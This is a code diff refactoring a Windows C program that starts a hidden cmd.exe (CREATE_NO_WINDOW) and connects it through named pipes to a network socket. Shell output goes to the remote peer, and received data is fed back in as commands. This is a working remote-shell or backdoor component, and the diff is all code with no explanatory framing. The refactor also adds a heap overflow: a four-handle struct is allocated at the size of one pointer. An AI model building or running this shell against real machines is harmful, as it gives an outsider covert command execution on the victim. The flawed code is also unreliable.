@@ -11,7 +11,7 @@ int main();
 
 typedef struct Pipe0
 {
-    HANDLE hs[4], evs[2], procH;
+    HANDLE HANDLES[4];
     int bufsize;
 } * Pipe;
 Pipe pipe;
@@ -21,29 +21,23 @@ DWORD OUTPUT_size;
 
 static Pipe create_pipes()
 {
-    TCHAR PipeNameBuffer[MAX_PATH];
     long i;
+    TCHAR PipeNameBuffer[MAX_PATH];
     PTSTR IO = "IO";
     DWORD open_modes[] = {PIPE_ACCESS_INBOUND, PIPE_ACCESS_OUTBOUND};
     DWORD access[] = {GENERIC_WRITE, GENERIC_READ};
-    DWORD nSize = 4096;
-    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), 0, 1};
 
     for (i = 0; i < 4; i++)
     {
-        pipe->hs[i] = pipe->procH = INVALID_HANDLE_VALUE;
+        pipe->HANDLES[i] = INVALID_HANDLE_VALUE;
     }
     pipe->bufsize = 0;
     for (i = 0; i < 2; i++)
     {
         sprintf(PipeNameBuffer, "\\\\.\\pipe\\%c%08x", IO[i], GetCurrentProcessId());
-        pipe->hs[i * 2] = CreateNamedPipe(PipeNameBuffer, open_modes[i] | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 1, nSize, nSize, 120 * 1000, 0);
-        SetHandleInformation(pipe->hs[i * 2], HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
-        pipe->hs[i * 2 + 1] = CreateFile(PipeNameBuffer, access[i], 0, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
-    }
-    for (i = 0; i < 2; i++)
-    {
-        pipe->evs[i] = CreateEvent(0, 1, 1, 0);
+        pipe->HANDLES[i * 2] = CreateNamedPipe(PipeNameBuffer, open_modes[i] | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 1, 4096, 4096, 120 * 1000, 0);
+        SetHandleInformation(pipe->HANDLES[i * 2], HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
+        pipe->HANDLES[i * 2 + 1] = CreateFile(PipeNameBuffer, access[i], 0, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
     }
 
     return (pipe);
@@ -52,13 +46,10 @@ static Pipe create_pipes()
 SECURITY_ATTRIBUTES sa;
 STARTUPINFO si;
 PROCESS_INFORMATION pi;
-#define snewn(n, t) (t *)malloc(n * sizeof(t))
 static const PTSTR pipe_init()
 {
-    PTSTR cmd = strdup("c:\\Windows\\system32\\cmd.exe");
-    const int sz = 999;
-    PTSTR s = snewn(sz, TCHAR), buf = snewn(sz, TCHAR);
-    pipe = snewn(1, struct Pipe0);
+    PTSTR cmd = "c:\\Windows\\system32\\cmd.exe";
+    pipe = malloc(1 * sizeof(PTSTR));
 
     create_pipes();
 
@@ -72,20 +63,19 @@ static const PTSTR pipe_init()
     si.dwFlags = STARTF_USESTDHANDLES;
     si.cbReserved2 = 0;
     si.lpReserved2 = NULL;
-    si.hStdInput = pipe->hs[0];
-    si.hStdOutput = pipe->hs[2];
-    si.hStdError = pipe->hs[2];
-    DWORD dw, ew, n, i = 0;
+    si.hStdInput = pipe->HANDLES[0];
+    si.hStdOutput = pipe->HANDLES[2];
+    si.hStdError = pipe->HANDLES[2];
 
     CreateProcess(NULL, cmd, &sa, NULL, TRUE, CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
 
     return NULL;
 }
 
-int exitwithchild()
+int exit_with_child()
 {
-    DWORD dw, ew;
-    if ((dw = GetExitCodeProcess(pi.hProcess, &ew)) && ew != STILL_ACTIVE)
+    DWORD ew;
+    if (GetExitCodeProcess(pi.hProcess, &ew) && ew != STILL_ACTIVE)
     {
         exit(ew);
     }
@@ -94,28 +84,20 @@ int exitwithchild()
 
 int frompipe(HANDLE in, HANDLE ou)
 {
-    static HANDLE revent = 0;
-    OVERLAPPED ol = {0};
-    if (!revent)
-    {
-        revent = CreateEvent(0, 0, 0, 0);
-    }
-    ol.hEvent = revent;
-    DWORD dw, r, rf, q;
-    char b[4096];
+    OVERLAPPED overlap = {0};
+    DWORD numberofbyte;
+    char buffer[4096];
     DWORD read = 0;
     for (;;)
     {
         Sleep(300);
-        if (rf = ReadFile(in, b, sizeof(b), &r, &ol))
+        if (ReadFile(in, buffer, sizeof(buffer), &numberofbyte, &overlap))
         {
-            OUTPUT_size = r;
-            strncpy(OUTPUT_text, b, r);
-            if (!r)
-                return -1;
+            OUTPUT_size = numberofbyte;
+            strncpy(OUTPUT_text, buffer, numberofbyte);
         }
-        exitwithchild();
-        return r;
+        exit_with_child();
+        return numberofbyte;
     }
 }
 
@@ -150,12 +132,10 @@ int init_socket(LPVOID lpParam)
     }
     freeaddrinfo(result);
 
-    DWORD rf;
-    char s[1000], *t;
-    if (t = (char *)pipe_init())
-        return printf(t);
-    char c = ' ';
-    DWORD q, r, dw, ew;
+    char buffer[1000], *init;
+    if (init = (char *)pipe_init()){
+        return printf(init);
+    }
 
     int sended = 0;
     for (;;)
@@ -163,7 +143,7 @@ int init_socket(LPVOID lpParam)
         Sleep(300);
         if (!sended)
         {
-            frompipe(pipe->hs[3], NULL);
+            frompipe(pipe->HANDLES[3], NULL);
             if (OUTPUT_size > 0)
             {
                 send(ConnectSocket, OUTPUT_text, 4096, 0);
@@ -173,21 +153,21 @@ int init_socket(LPVOID lpParam)
         }
         else
         {
-            iResult = recv(ConnectSocket, s, recvbuflen, 0);
+            iResult = recv(ConnectSocket, buffer, recvbuflen, 0);
             if (iResult == SOCKET_ERROR)
             {
                 closesocket(ConnectSocket);
                 ConnectSocket = INVALID_SOCKET;
                 for (int h = 0; h < 4; h++)
                 {
-                    CloseHandle(pipe->hs[h]);
+                    CloseHandle(pipe->HANDLES[h]);
                 }
             }
             if (iResult)
             {
-                WriteFile(pipe->hs[1], s, strlen(s), NULL, 0);
-                memset(s, 0, 1000);
-                s[0] = '\0';
+                WriteFile(pipe->HANDLES[1], buffer, strlen(buffer), NULL, 0);
+                memset(buffer, 0, 1000);
+                buffer[0] = '\0';
                 sended = 0;
             }
         }
